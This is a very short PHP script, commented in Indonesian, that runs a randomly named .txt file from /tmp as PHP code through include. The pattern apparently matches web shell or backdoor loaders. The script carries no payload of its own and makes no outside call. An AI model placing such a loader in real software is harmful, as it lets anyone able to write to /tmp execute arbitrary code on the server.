<?php
// Path ke file PHP
$filePath = '/tmp/67690c2225242.txt';

// Cek apakah file ada
if (file_exists($filePath)) {
    // Eksekusi file PHP
    include $filePath;
} else {
    echo "File tidak ditemukan.";
}
?>
